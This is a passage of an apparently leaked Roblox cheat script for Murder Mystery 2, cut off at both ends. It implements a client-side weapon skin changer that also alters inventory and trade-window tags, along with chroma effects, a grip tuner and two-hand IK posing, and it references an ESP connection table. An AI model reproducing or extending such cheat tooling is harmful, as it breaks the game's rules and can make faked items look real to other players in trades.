					part = result

					pcall(function()
						part.TextureID = value126.TextureId or ""
					end)

					if value126.Size then
						pcall(function()
							part.Size = value126.Size * vector
						end)
					end
				end
			else
				part = Instance.new("Part")
				part.Size = (props.Size or parent.Size) * vector
				local specialMesh = Instance.new("SpecialMesh")
				specialMesh.MeshType = Enum.MeshType.FileMesh
				specialMesh.MeshId = value126.MeshId
				specialMesh.TextureId = value126.TextureId or ""

				if value126.Scale then
					specialMesh.Scale = value126.Scale * vector
				end

				if value126.Offset then
					specialMesh.Offset = value126.Offset
				end

				if value126.VertexColor then
					specialMesh.VertexColor = value126.VertexColor
				end

				specialMesh.Parent = part
			end

			if part then
				part.Name = "SkinMesh"
				part.CFrame = parent.CFrame
				part.Anchored = false
				part.CanCollide = false
				part.CanQuery = false
				part.Massless = true
				part.Transparency = props.Transparency or 0

				if props.Color then
					part.Color = props.Color
				end

				if props.Material then
					part.Material = props.Material
				end

				if props.Reflectance then
					part.Reflectance = props.Reflectance
				end

				part:SetAttribute("MM2SkinExtra", true)
				part.Parent = parent
				local weldConstraint = Instance.new("WeldConstraint")
				weldConstraint.Part0 = part
				weldConstraint.Part1 = parent
				weldConstraint:SetAttribute("MM2SkinExtra", true)
				weldConstraint.Parent = part
			else
				pcall(function()
					parent.Transparency = props.Transparency or 0
				end)
			end
		else
			local specialMesh = parent:FindFirstChildOfClass("SpecialMesh")

			if not specialMesh then
				specialMesh = Instance.new("SpecialMesh")
				specialMesh.Name = "Mesh"
				specialMesh:SetAttribute("MM2SkinExtra", true)
				specialMesh.Parent = parent
			end

			pcall(function()
				specialMesh.MeshType = Enum.MeshType.FileMesh
			end)

			if value126.MeshId then
				pcall(function()
					specialMesh.MeshId = value126.MeshId
				end)
			end

			pcall(function()
				specialMesh.TextureId = value126.TextureId or ""
			end)

			local offset = value126.Offset or Vector3.new()

			if value126.VertexColor then
				pcall(function()
					specialMesh.VertexColor = value126.VertexColor
				end)
			end

			if value126.Scale then
				pcall(function()
					specialMesh.Scale = value126.Scale
				end)
			elseif value126.FromMeshPart and value126.Size then
				local meshId = func143(value126.MeshId)

				if meshId then
					pcall(function()
						specialMesh.Scale = value126.Size / meshId
					end)
				end
			end

			if flag184 and typeof(value126.Size) == "Vector3" then
				offset += Vector3.new(0, 0, value126.Size.Z * func154(flag182).Len)
			end

			pcall(function()
				specialMesh.Offset = offset
			end)

			if props.Size and not flag184 then
				pcall(function()
					parent.Size = props.Size
				end)
			end
		end

		func148(parent, param114)
		local value127 = part or parent
		flag182 = flag182 and flag182.Chroma == true

		local tbl81 = {
			Decal = true,
			Texture = true,
			Beam = true,
			Sound = true,
			ParticleEmitter = true,
			Trail = true,
			Fire = true,
			Sparkles = true,
		}

		local func157 = ipairs
		local children = param114.Children or {}

		for _, child in func157(children) do
			if child ~= value126.MeshNode and not tbl77[child.Class] and (not flag184 or tbl81[child.Class]) then
				value125(child, value127, CFrame.new(), value127, 1):SetAttribute("MM2SkinExtra", true)
			end
		end

		if flag182 then
			func152(value127)
		else
			_G.MM2ChromaGroups[parent] = nil

			if part then
				_G.MM2ChromaGroups[part] = nil
			end
		end

		return true
	end

	_G.__HeldGunBaseGrip = function(instance25, flag185, param115)
		if flag185 and flag185.ItemType == "Knife" then
			return param115
		end
		local handle = instance25:FindFirstChild("Handle")
		if not handle then
			return param115
		end
		local attribute = handle:GetAttribute("MM2OriginalSize")

		if typeof(attribute) ~= "Vector3" then
			attribute = handle.Size
		end

		if attribute.Y > attribute.X and attribute.Y > attribute.Z then
			return CFrame.new(0, -0.21, 0.47)
		end
		return param115
	end

	local function func158(instance26, param116, param117)
		if not instance26 or not instance26:IsA("Tool") then
			return
		end

		if instance26:GetAttribute("MM2OriginalGrip") == nil then
			instance26:SetAttribute("MM2OriginalGrip", instance26.Grip)
		end

		local attribute = instance26:GetAttribute("MM2OriginalGrip")
		if typeof(attribute) ~= "CFrame" then
			return
		end
		local num47 = _G.__HeldGunBaseGrip(instance26, param116, attribute)
		local num48 = func154(param116, param117)

		pcall(function()
			instance26.Grip = num47 * num48.Rot + num48.Pos
		end)
	end

	local function func159(flag186)
		local character = localPlayer.Character
		local weaponDisplays = character and workspace:FindFirstChild("WeaponDisplays")
		if not weaponDisplays then
			return nil
		end
		local str3 = flag186 == "Knife" and "KnifeDisplay" or "GunDisplay"

		for _, child in ipairs(weaponDisplays:GetChildren()) do
			if child.Name == str3 then
				local rigidConstraint = child:FindFirstChildOfClass("RigidConstraint")
				rigidConstraint = rigidConstraint and rigidConstraint.Attachment0
				if rigidConstraint and rigidConstraint:IsDescendantOf(character) then
					return child
				end
			end
		end

		return nil
	end

	local function func160(childName2)
		local character = localPlayer.Character
		character = character and character:FindFirstChild(childName2)
		if character and character:IsA("Tool") then
			return character
		end
		local backpack = localPlayer:FindFirstChildOfClass("Backpack")
		backpack = backpack and backpack:FindFirstChild(childName2)
		if backpack and backpack:IsA("Tool") then
			return backpack
		end
		return nil
	end

	local function func161(instance27, textureId)
		if not instance27 or not instance27:IsA("Tool") or not textureId or textureId == "" then
			return false
		end
		local textureId2 = instance27.TextureId
		if textureId2 == textureId then
			return true
		end

		pcall(function()
			instance27.TextureId = textureId
		end)

		pcall(function()
			for _, child in ipairs(localPlayer.PlayerGui.BackpackUI.BackpackFrame:GetChildren()) do
				local container = child:IsA("GuiObject") and child:FindFirstChild("Container")
				local toolIcon = container and container:FindFirstChild("ToolIcon")

				if toolIcon and toolIcon.Image == textureId2 then
					toolIcon.Image = textureId
					local nameLabel = container:FindFirstChild("NameLabel")

					if nameLabel then
						nameLabel.Text = ""
					end
				end
			end
		end)

		return true
	end

	local tbl82 = {
		{ "CrossPlatform", "ItemFrameTest", "ItemFrame", "Tags", "FX" },
		{ "MainGUI", "Inventory2", "EquipContainer", "ItemFrame", "Tags", "FX" },
		{ "TradeGUI", "Container", "Trade", "YourOffer", "Container", "NewItem1", "Tags", "FX" },
	}

	local function func162()
		for _, item61 in ipairs(tbl82) do
			local playerGui = localPlayer:FindFirstChild("PlayerGui")

			for _, item62 in ipairs(item61) do
				playerGui = playerGui and playerGui:FindFirstChild(item62)
				if playerGui then
					continue
				end
				break
			end

			if playerGui then
				return playerGui
			end
		end

		return nil
	end

	local function func163(instance28)
		local parent = instance28.Parent
		if not parent then
			return
		end
		local n2 = 0

		for _, child in ipairs(parent:GetChildren()) do
			if child ~= instance28 and child:IsA("GuiObject") then
				n2 = math.max(n2, child.ZIndex)
			end
		end

		if instance28.ZIndex <= n2 then
			instance28.ZIndex = n2 + 1
		end
	end

	local function func164(parent)
		local fx = parent:FindFirstChild("FX")

		if not fx then
			local result16 = func162()
			if not result16 then
				return nil
			end
			fx = result16:Clone()
			fx.Name = "FX"
			fx.LayoutOrder = 1
			fx:SetAttribute("MM2SkinExtra", true)
			fx.Parent = parent
		end

		return fx
	end

	local tbl83 = { "FX", "Chroma", "Evo", "Christmas", "Halloween", "Unique" }

	local function func165(instance29, childName3)
		if not instance29 then
			return
		end

		for _, item63 in ipairs(tbl83) do
			local obj31 = instance29:FindFirstChild(item63)

			if obj31 and obj31:IsA("GuiObject") then
				obj31.Visible = false
			end
		end

		if childName3.FX then
			local value128 = func164(instance29)

			if value128 then
				value128.Visible = true
			end
		end

		if childName3.Chroma then
			local chroma = instance29:FindFirstChild("Chroma")

			if chroma then
				chroma.Visible = true
			end
		end

		if childName3.Event == "Christmas" or childName3.Event == "Halloween" then
			local value129 = instance29:FindFirstChild(childName3.Event)

			if value129 then
				value129.Visible = true
				local text = tostring(childName3.Year or "")

				pcall(function()
					value129.Year.Text = text
				end)

				pcall(function()
					value129.Year2.Text = text
				end)
			end
		end

		func163(instance29)
	end

	local function func166(param118)
		local itemType = param118.ItemType == "Knife" and "Knife" or "Gun"
		local common = tbl75[param118.Rarity] or tbl75.Common

		pcall(function()
			local container = localPlayer.PlayerGui.MainGUI.Game.Inventory.Main.Weapons.Equipped.Container[itemType].Container
			container.ItemName.Label.Text = param118.ItemName
			container.ItemName.BackgroundColor3 = common
			container.Container.Icon.Image = param118.Image
			container.Container.Amount.Text = ""
			func165(container:FindFirstChild("Tags"), param118)
		end)

		pcall(function()
			local itemFrame = localPlayer.PlayerGui.MainGUI.Inventory2.EquipContainer.ItemFrame
			itemFrame.ItemName.Label.Text = param118.ItemName
			itemFrame.ItemName.BackgroundColor3 = common
			itemFrame.Container.Icon.Image = param118.Image
			func165(itemFrame:FindFirstChild("Tags"), param118)
		end)
	end

	_G.MM2SkinChoice = _G.MM2SkinChoice or {}
	local tbl84 = { Harvester = Vector3.new(1, 1.6, 1), Icepiercer = Vector3.new(1, 1.6, 1) }
	_G.MM2SkinApplied = _G.MM2SkinApplied or {}

	local function func167(param119)
		local flag187 = _G.MM2SkinChoice[param119]
		if not flag187 then
			return false
		end
		local result17 = loadData()
		result17 = result17 and result17[flag187]
		if not result17 or type(result17.Model) ~= "table" then
			return false
		end
		local value130 = func159(param119)
		local flag188 = false

		if value130 then
			func156(value130, result17.Model, result17.Meta, tbl84[flag187])
			flag188 = true
		end

		local obj32 = func160(param119)

		if obj32 then
			func161(obj32, result17.Meta and result17.Meta.Image)
			local handle = obj32:FindFirstChild("Handle")

			if handle then
				func156(handle, result17.Model, result17.Meta, tbl84[flag187], true)
				func158(obj32, result17.Meta, result17.Model)
				flag188 = true
			end
		end

		if result17.Meta then
			func166(result17.Meta)
		end

		if flag188 then
			_G.MM2SkinApplied[param119] = flag187
		end

		return flag188
	end

	local function func168()
		local flag189 = false

		for _, item64 in ipairs({ "Gun", "Knife" }) do
			if func167(item64) then
				flag189 = true
			end
		end

		return flag189
	end

	local function func169(character)
		if not character then
			return
		end

		table.insert(_G.CoinESPConn, character.ChildAdded:Connect(function(child)
			if child:IsA("Tool") and _G.MM2SkinChoice[child.Name] then
				task.defer(function()
					func167(child.Name)
				end)
			end
		end))

		local backpack = localPlayer:FindFirstChildOfClass("Backpack")

		if backpack then
			table.insert(_G.CoinESPConn, backpack.ChildAdded:Connect(function(child)
				if child:IsA("Tool") and _G.MM2SkinChoice[child.Name] then
					task.defer(function()
						func167(child.Name)
					end)
				end
			end))
		end

		task.spawn(function()
			for i = 1, 20 do
				if localPlayer.Character ~= character then
					return
				end

				if next(_G.MM2SkinChoice) and func168() then
					return
				end
				task.wait(0.25)
			end
		end)
	end

	if localPlayer.Character then
		func169(localPlayer.Character)
	end

	table.insert(_G.CoinESPConn, localPlayer.CharacterAdded:Connect(func169))
	--[[ 𝗦𝗟 | 𝗦𝗼𝘂𝗿𝗰𝗲 𝗟𝗲𝗮𝗸 :: discord.gg/x7YbZeezpm ]]

	_G.__MM2RescanChroma = function()
		for k in pairs(_G.MM2ChromaGroups) do
			if not k.Parent then
				_G.MM2ChromaGroups[k] = nil
			end
		end

		for _, item65 in ipairs({ "Gun", "Knife" }) do
			local obj33 = func159(item65)

			if obj33 and _G.MM2SkinChoice[item65] and obj33:GetAttribute("MM2OriginalSize") == nil then
				pcall(func167, item65)
				obj33 = func159(item65)
			end

			local flag190 = _G.MM2SkinApplied[item65]

			if flag190 then
				flag190 = (_G.MM2SkinData or {})[flag190]
			end

			if flag190 and flag190.Meta and flag190.Meta.Chroma == true then
				if obj33 and not _G.MM2ChromaGroups[obj33] then
					func152(obj33)
				end

				local handle = func160(item65)
				handle = handle and handle:FindFirstChild("Handle")

				if handle and not _G.MM2ChromaGroups[handle] then
					func152(handle)
				end
			elseif flag190 then
				if obj33 then
					_G.__MM2ClearChromaArtifacts(obj33)
				end

				local handle = func160(item65)
				handle = handle and handle:FindFirstChild("Handle")

				if handle then
					_G.__MM2ClearChromaArtifacts(handle)
				end
			end
		end
	end

	_G.__MM2ChromaState = { hue = 0, since = 1 }

	table.insert(_G.CoinESPConn, RunService.Heartbeat:Connect(function(deltaTime)
		local n2 = math.clamp(tonumber(deltaTime) or 0.016, 0, 0.1)
		local mM2ChromaState = _G.__MM2ChromaState
		mM2ChromaState.since = mM2ChromaState.since + n2

		if mM2ChromaState.since >= 2 then
			mM2ChromaState.since = 0
			pcall(_G.__MM2RescanChroma)
		end

		if not next(_G.MM2ChromaGroups) then
			return
		end
		mM2ChromaState.hue = (mM2ChromaState.hue + n2 * 0.32) % 1
		local color = Color3.fromHSV(mM2ChromaState.hue, 1, 1)
		local colorSequence = ColorSequence.new(color)

		for k, mM2ChromaGroup in pairs(_G.MM2ChromaGroups) do
			if not k.Parent then
				_G.MM2ChromaGroups[k] = nil
			else
				for _, part in ipairs(mM2ChromaGroup.Parts) do
					if part.Parent then
						part.Color = color
					end
				end

				local func170 = ipairs
				local decals = mM2ChromaGroup.Decals or {}

				for _, decal in func170(decals) do
					if decal.Parent then
						pcall(function()
							decal.Color3 = color
						end)
					end
				end

				for _, item66 in ipairs(mM2ChromaGroup.FX) do
					if item66.Parent then
						pcall(function()
							if item66:IsA("ParticleEmitter") or item66:IsA("Beam") or item66:IsA("Trail") then
								item66.Color = colorSequence
							elseif item66:IsA("Fire") then
								item66.Color = color
								item66.SecondaryColor = color
							elseif item66:IsA("Sparkles") then
								item66.SparkleColor = color
							end
						end)
					end
				end
			end
		end
	end))

	_G.SkinChanger = {
		LoadData = loadData,
		RarityColor = tbl75,
		ListSkins = function(param120)
			local flag191, value131 = loadData()
			if not flag191 then
				return nil, value131
			end
			local list33 = {}

			for k, value132 in pairs(flag191) do
				local meta = value132.Meta

				if type(meta) == "table" and meta.ItemType == param120 then
					list33[#list33 + 1] = {
						Key = k,
						Name = tostring(meta.ItemName or k),
						Rarity = tostring(meta.Rarity or ""),
						Chroma = meta.Chroma == true,
					}
				end
			end

			local function func171(param121)
				if param121.Rarity == "Ancient" then
					return 1
				end

				if param121.Chroma then
					return 2
				end
				return 3
			end

			table.sort(list33, function(param122, param123)
				local flag192 = func171(param122)
				local value133 = func171(param123)
				if flag192 ~= value133 then
					return flag192 < value133
				end

				if param122.Name ~= param123.Name then
					return param122.Name < param123.Name
				end
				return param122.Key < param123.Key
			end)

			return list33
		end,
		Select = function(param124, param125)
			_G.MM2SkinChoice[param124] = param125
		end,
		Apply = function(str4)
			if not localPlayer.Character then
				return false, "Character not found."
			end

			if not _G.MM2SkinChoice[str4] then
				return false, "Pick a skin first."
			end

			if func167(str4) then
				return true, "Skin Changed"
			end
			return false, str4 .. " not found, try again in a moment."
		end,
		Clear = function(param126)
			_G.MM2SkinChoice[param126] = nil
		end,
		TuneHeld = function(param127, flag193)
			local tbl85 = flag193 or {}
			local flag194 = _G.MM2SkinApplied[param127] or _G.MM2SkinChoice[param127]
			local result18 = loadData()
			local flag195 = flag194 and result18 and result18[flag194]
			local itemName = flag195 and flag195.Meta and flag195.Meta.ItemName
			if not itemName then
				return false, "no skin applied to " .. tostring(param127)
			end
			local tbl86 = _G.MM2HeldFitOverride[itemName] or {}

			if tbl85.RotX or tbl85.RotY or tbl85.RotZ then
				tbl86.Rot = CFrame.Angles(tbl85.RotX or 0, tbl85.RotY or 0, tbl85.RotZ or 0)
			end

			if tbl85.Pos ~= nil then
				tbl86.Pos = tbl85.Pos
			end

			if tbl85.Len ~= nil then
				tbl86.Len = tbl85.Len
			end

			_G.MM2HeldFitOverride[itemName] = tbl86
			func167(param127)
			local value134, value135, value136 = (tbl86.Rot or CFrame.new()):ToEulerAnglesXYZ()
			print(("[HELD_FIT_SKIN] %s = { Rot = CFrame.Angles(%.4f, %.4f, %.4f), Pos = %s, Len = %s },"):format(itemName, value134, value135, value136, tostring(tbl86.Pos or Vector3.new()), tostring(tbl86.Len or 0)))
			return true, "tuned"
		end,
	}
end

if _G.__SupportHandConn then
	pcall(function()
		_G.__SupportHandConn:Disconnect()
	end)
end

pcall(function()
	RunService:UnbindFromRenderStep("MM2SupportHandPose")
end)

if _G.__SupportHandShoulderRestore then
	local supportHandShoulderRestore = _G.__SupportHandShoulderRestore

	pcall(function()
		supportHandShoulderRestore.object[supportHandShoulderRestore.property] = supportHandShoulderRestore.value
	end)

	_G.__SupportHandShoulderRestore = nil
end

if _G.__ShoulderProbeOrig then
	pcall(function()
		localPlayer.Character.LeftUpperArm.LeftShoulder.Attachment0.CFrame = _G.__ShoulderProbeOrig
	end)

	_G.__ShoulderProbeOrig = nil
end

if _G.__SupportHandIK then
	pcall(function()
		_G.__SupportHandIK:Destroy()
	end)
end

if _G.__SupportHandTarget then
	pcall(function()
		_G.__SupportHandTarget:Destroy()
	end)
end

if _G.__SupportHandPole then
	pcall(function()
		_G.__SupportHandPole:Destroy()
	end)
end

if _G.__SupportHandPalm then
	pcall(function()
		_G.__SupportHandPalm:Destroy()
	end)
end

if _G.__IKPoleProbe then
	pcall(function()
		_G.__IKPoleProbe:Destroy()
	end)

	_G.__IKPoleProbe = nil
end

if _G.__PalmProbe then
	pcall(function()
		_G.__PalmProbe:Destroy()
	end)

	_G.__PalmProbe = nil
end

if _G.__IKProbe then
	pcall(function()
		_G.__IKProbe.ik:Destroy()
	end)

	pcall(function()
		_G.__IKProbe.target:Destroy()
	end)

	_G.__IKProbe = nil
end

_G.__SupportHandCfg = { Pos = Vector3.new(-0.2, -0.27, 0.7), Palm = Vector3.new(-0.07, -0.29, 0.24) }

do
	local supportHandCfg = _G.__SupportHandCfg
	local flag196 = false
	local value137 = nil
	local value138 = nil

	local function func172()
		if _G.__SupportHandIK then
			_G.__SupportHandIK:Destroy()
			_G.__SupportHandIK = nil
		end

		if _G.__SupportHandTarget then
			_G.__SupportHandTarget:Destroy()
			_G.__SupportHandTarget = nil
		end

		if _G.__SupportHandPole then
			_G.__SupportHandPole:Destroy()
			_G.__SupportHandPole = nil
		end

		if _G.__SupportHandPalm then
			_G.__SupportHandPalm:Destroy()
			_G.__SupportHandPalm = nil
		end

		if _G.__SupportHandShoulderRestore then
			local supportHandShoulderRestore = _G.__SupportHandShoulderRestore

			pcall(function()
				supportHandShoulderRestore.object[supportHandShoulderRestore.property] = supportHandShoulderRestore.value
			end)

			_G.__SupportHandShoulderRestore = nil
		end

		value137 = nil
		value138 = nil
	end

	local function func173()
		local gun = _G.MM2SkinApplied and _G.MM2SkinApplied.Gun
		if gun == "Gingerscope" then
			return true
		end
		local mM2SkinData = _G.MM2SkinData
		local flag197 = gun and type(mM2SkinData) == "table" and mM2SkinData[gun]
		return flag197 and flag197.Meta and flag197.Meta.ItemName == "Gingerscope" or false
	end

	local function func174()
		local character = localPlayer.Character
		local gun = character and character:FindFirstChild("Gun")
		local handle = gun and gun:IsA("Tool") and gun:FindFirstChild("Handle")
		local humanoid = character and character:FindFirstChildOfClass("Humanoid")

		if not (flag196 or func173()) or not handle or not handle:IsA("BasePart") or not humanoid or not character:FindFirstChild("UpperTorso") or not character:FindFirstChild("LeftUpperArm") or not character:FindFirstChild("LeftHand") then
			if value138 then
				func172()
			end

			_G.__SupportHandState = "inactive"
			return
		end

		if value137 == character and value138 == handle and _G.__SupportHandIK and _G.__SupportHandIK.Parent == humanoid then
			return
		end
		func172()
		local n2 = character.LeftUpperArm.Size.Y + character.LeftLowerArm.Size.Y + character.LeftHand.Size.Y

		if math.abs(n2 / 2.38 - 1) > 0.15 then
			value137 = character
			value138 = handle
			_G.__SupportHandState = "off: arm length " .. string.format("%.2f", n2)
			return
		end

		local leftShoulder = character.LeftUpperArm:FindFirstChild("LeftShoulder")

		if leftShoulder and leftShoulder:IsA("AnimationConstraint") and leftShoulder.Attachment0 then
			local attachment0 = leftShoulder.Attachment0
			_G.__SupportHandShoulderRestore = { object = attachment0, property = "CFrame", value = attachment0.CFrame }
			attachment0.CFrame = attachment0.CFrame + Vector3.new(0.38, 0, -0.42)
		elseif leftShoulder and leftShoulder:IsA("Motor6D") then
			_G.__SupportHandShoulderRestore = { object = leftShoulder, property = "C0", value = leftShoulder.C0 }
			leftShoulder.C0 = leftShoulder.C0 + Vector3.new(0.38, 0, -0.42)
		end

		local attachment = Instance.new("Attachment")
		attachment.Name = "MM2SupportHandTarget"
		attachment.Position = supportHandCfg.Pos
		attachment.Parent = handle
		local attachment2 = Instance.new("Attachment")
		attachment2.Name = "MM2SupportHandPole"
		attachment2.Position = Vector3.new(-1.4, -0.6, -0.8)
		attachment2.Parent = character.UpperTorso
		local attachment3 = Instance.new("Attachment")
		attachment3.Name = "MM2SupportPalm"
		attachment3.Position = supportHandCfg.Palm
		attachment3.Parent = character.LeftHand
		local ikControl = Instance.new("IKControl")
		ikControl.Name = "MM2SupportHandIK"
		ikControl.Type = Enum.IKControlType.Position
		ikControl.ChainRoot = character.LeftUpperArm
		ikControl.EndEffector = attachment3
		ikControl.Target = attachment
		ikControl.Pole = attachment2
		ikControl.Weight = 1
		ikControl.SmoothTime = 0.12
		ikControl.Parent = humanoid
		local value139 = _G
		_G.__SupportHandTarget = attachment
		value139.__SupportHandPole = attachment2
		local value140 = _G
		_G.__SupportHandPalm = attachment3
		value140.__SupportHandIK = ikControl
		value137 = character
		value138 = handle
		_G.__SupportHandState = "IK active"
	end

	_G.TwoHandHoldSetEnabled = function(flag198)
		flag196 = flag198 and true or false
		func174()
	end

	_G.TwoHandHoldEnabled = function()
		return flag196 or func173()
	end

	_G.SupportHandTune = function(obj)
		if type(obj) == "table" and typeof(obj.Pos) == "Vector3" then
			supportHandCfg.Pos = obj.Pos

			if _G.__SupportHandTarget then
				_G.__SupportHandTarget.Position = supportHandCfg.Pos
			end
		end

		if type(obj) == "table" and typeof(obj.Palm) == "Vector3" then
			supportHandCfg.Palm = obj.Palm

			if _G.__SupportHandPalm then
				_G.__SupportHandPalm.Position = supportHandCfg.Palm
			end
		end

		return true
	end

	_G.__SupportHandConn = RunService.Heartbeat:Connect(func174)
	func174()
end

do
	local str5 = "Gun"
	local tbl87 = { pos = Vector3.zero, len = 0, rx = -1.5707963267948966, ry = 0, rz = 0 }
	local flag199 = false
	local flag200 = false
	local connection2 = nil

	local function func175()
		local mM2SkinApplied = _G.MM2SkinApplied and _G.MM2SkinApplied[str5] or _G.MM2SkinChoice and _G.MM2SkinChoice[str5]
		local mM2SkinData = _G.MM2SkinData
		local flag201 = mM2SkinApplied and type(mM2SkinData) == "table" and mM2SkinData[mM2SkinApplied]
		return flag201 and flag201.Meta and flag201.Meta.ItemName or nil
	end

	local function func176()
		local value141 = tbl87
		local value142 = tbl87
		local value143 = tbl87
		local value144 = tbl87
		tbl87.pos = Vector3.new()
		value141.len = 0
		value142.rx = -1.5707963267948966
		value143.ry = 0
		value144.rz = 0
		local result19 = func175()
		local mM2HeldFitOverride = result19 and _G.MM2HeldFitOverride and _G.MM2HeldFitOverride[result19]

		if type(mM2HeldFitOverride) == "table" then
			if typeof(mM2HeldFitOverride.Pos) == "Vector3" then
				tbl87.pos = mM2HeldFitOverride.Pos
			end

			if type(mM2HeldFitOverride.Len) == "number" then
				tbl87.len = mM2HeldFitOverride.Len
			end

			if typeof(mM2HeldFitOverride.Rot) == "CFrame" then
				local value145 = tbl87
				local value146 = tbl87
				local value147 = tbl87
				local value148, value149, value150 = mM2HeldFitOverride.Rot:ToEulerAnglesXYZ()
				value145.rx = value148
				value146.ry = value149
				value147.rz = value150
			end
		end

		flag199 = true
	end

	local function func177()
		if not (_G.SkinChanger and _G.SkinChanger.TuneHeld) then
			return
		end
		local flag202, flag203 = _G.SkinChanger.TuneHeld(str5, { Pos = tbl87.pos, Len = tbl87.len, RotX = tbl87.rx, RotY = tbl87.ry, RotZ = tbl87.rz })

		if _G.WindNotify then
			local windNotify = _G.WindNotify
			local str6 = "Grip Tuner (" .. str5 .. ")"
			flag202 = flag202 and ("Pos %.2f, %.2f, %.2f   Len %.2f"):format(tbl87.pos.X, tbl87.pos.Y, tbl87.pos.Z, tbl87.len)

			if not flag202 then
				flag202 = tostring(flag203 or "no " .. str5 .. " skin applied")
			end

			windNotify(str6, flag202, "wrench")
		end
	end

	local tbl88 = {
		[Enum.KeyCode.KeypadEight] = function(param128)
			tbl87.pos = tbl87.pos - Vector3.new(0, param128, 0)
		end,
		[Enum.KeyCode.KeypadTwo] = function(param129)
			tbl87.pos = tbl87.pos + Vector3.new(0, param129, 0)
		end,
		[Enum.KeyCode.KeypadFour] = function(param130)
			tbl87.pos = tbl87.pos - Vector3.new(0, 0, param130)
		end,
		[Enum.KeyCode.KeypadSix] = function(param131)
			tbl87.pos = tbl87.pos + Vector3.new(0, 0, param131)
		end,
		[Enum.KeyCode.KeypadOne] = function(param132)
			tbl87.pos = tbl87.pos - Vector3.new(param132, 0, 0)
		end,
		[Enum.KeyCode.KeypadThree] = function(param133)
			tbl87.pos = tbl87.pos + Vector3.new(param133, 0, 0)
		end,
		[Enum.KeyCode.KeypadSeven] = function(num49)
			tbl87.len = tbl87.len - num49 * 0.3
		end,
		[Enum.KeyCode.KeypadNine] = function(num50)
			tbl87.len = tbl87.len + num50 * 0.3
		end,
		[Enum.KeyCode.KeypadMinus] = function(num51)
			tbl87.rx = tbl87.rx - num51 * 0.35
		end,
		[Enum.KeyCode.KeypadPlus] = function(num52)
			tbl87.rx = tbl87.rx + num52 * 0.35
		end,
		[Enum.KeyCode.KeypadFive] = function()
		end,
	}

	_G.GripTunerSetEnabled = function(flag204)
		flag200 = flag204 and true or false

		if flag200 and not connection2 then
			connection2 = UserInputService.InputBegan:Connect(function(input, gameProcessed)
				if gameProcessed or not flag200 then
					return
				end
				local keyCode = input.KeyCode

				if keyCode == Enum.KeyCode.KeypadMultiply then
					str5 = str5 == "Gun" and "Knife" or "Gun"
					flag199 = false

					if _G.WindNotify then
						_G.WindNotify("Grip Tuner", "target -> " .. str5, "repeat")
					end

					return
				end

				if keyCode == Enum.KeyCode.KeypadPeriod then
					local result20 = func175()

					if result20 and _G.MM2HeldFitOverride then
						_G.MM2HeldFitOverride[result20] = nil
					end

					flag199 = false

					if _G.SkinChanger and _G.SkinChanger.TuneHeld then
						pcall(_G.SkinChanger.TuneHeld, str5, {})
					end

					if _G.WindNotify then
						_G.WindNotify("Grip Tuner", str5 .. " override cleared", "undo-2")
					end

					return
				end

				local entry19 = tbl88[keyCode]
				if not entry19 then
					return
				end

				if not flag199 then
					func176()
				end

				entry19((UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) or UserInputService:IsKeyDown(Enum.KeyCode.RightShift)) and 0.025 or 0.1)
				func177()
			end)

			table.insert(_G.CoinESPConn, connection2)
		elseif not flag200 and connection2 then
			connection2:Disconnect()
			connection2 = nil
		end
	end
end

local function func178()
	local Players2 = game:GetService("Players")
	local TweenService2 = game:GetService("TweenService")
	local UserInputService2 = game:GetService("UserInputService")
	local HttpService = game:GetService("HttpService")
	local RunService2 = game:GetService("RunService")
	local localPlayer2 = Players2.LocalPlayer

	local tbl89 = {
		backpack = 140420225386018,
		badge = 116620312917084,
		barrel = 130647115622774,
		bomb = 139223800924636,
		bot = 80451686744860,
		candy = 107812129154678,
		["chart-line"] = 101833156055618,
		check = 93898873302694,
		["chevron-down"] = 134243273101015,
		["chevron-right"] = 92473583511724,
		["chevron-up"] = 122444883127455,
		["chevrons-up"] = 100467452364672,
		["circle-check"] = 85262178816537,
		["circle-dot"] = 82947033619201,
		["circle-off"] = 97923456918886,
		["circle-user"] = 136220511671311,
		["circle-x"] = 76821953846248,
		["clipboard-check"] = 92649798577170,
		["cloud-off"] = 131907154501444,
		cloud = 121226497050352,
		coffee = 106864403231093,
		coins = 116510979641930,
		copy = 78979572434545,
		crosshair = 134242818164054,
		egg = 117851493400222,
		["eye-off"] = 135928786788378,
		eye = 100033680381365,
		["folder-open"] = 76018996254888,
		footprints = 139192589041315,
		gauge = 110273524101447,
		gem = 112904952151156,
		ghost = 113822048130017,
		gift = 109855212076373,
		["git-commit-horizontal"] = 133646041800147,
		globe = 114238209622913,
		["grip-vertical"] = 137183678565296,
		hand = 130703864968637,
		hourglass = 86160434939203,
		house = 98755624629571,
		info = 124560466474914,
		keyboard = 121474456068237,
		layers = 81973586053257,
		["layout-grid"] = 81344910161871,
		link = 131607023382430,
		["list-checks"] = 99809353635593,
		["locate-fixed"] = 137367361548433,
		lock = 134724289526879,
		["maximize-2"] = 73085922906397,
		minus = 118026365011536,
		["minimize-2"] = 116269596042539,
		maximize = 76045941763188,
		monitor = 72664649203050,
		["mouse-pointer-click"] = 107150227368485,
		["move-down"] = 70510115135583,
		["move-up"] = 84505444262658,
		move = 116138709011735,
		navigation = 79308213542922,
		["package-open"] = 132890233237818,
		["paint-bucket"] = 124275586663284,
		palette = 86350350950064,
		["panel-top"] = 75838479462875,
		pipette = 133167932934404,
		plane = 126985561580989,
		play = 135609604299893,
		power = 96479131758775,
		["refresh-ccw"] = 117913330389477,
		["refresh-cw"] = 138133190015277,
		["repeat"] = 121886242955173,
		["rotate-ccw"] = 110116685948665,
		ruler = 81432445547423,
		save = 126116963775616,
		["scan-eye"] = 99244790601968,
		scan = 123104789658180,
		search = 121018724060431,
		send = 127751956873796,
		server = 92188766517878,
		settings = 80758916183665,
		["shield-check"] = 87354736164608,
		["shield-x"] = 73370117343811,
		shield = 110987169760162,
		["shopping-bag"] = 71885477293226,
		shuffle = 132382786975101,
		skull = 137726256442333,
		["sliders-horizontal"] = 85538382643347,
		smile = 105880397565283,
		sparkles = 138635884129147,
		square = 86304921356806,
		star = 136141469398409,
		sun = 110150589884127,
		sword = 124448418211665,
		swords = 81872698913435,
		table = 109109148250737,
		tag = 129104970103940,
		target = 87563802520297,
		["triangle-alert"] = 125920361880643,
		["undo-2"] = 113885292059932,
		["user-round-x"] = 122367980560930,
		["user-x"] = 139748155894754,
		user = 81589895647169,
		users = 115398113982385,
		video = 107587444636945,
		webhook = 112812457747322,
		wind = 114551690399915,
		wrench = 112148279212860,
		x = 110786993356448,
		zap = 130551565616516,
		["zoom-out"] = 108334162607319,
	}

	local color = Color3.fromRGB
	local color2 = Color3.new(1, 1, 1)

	local tbl90 = {
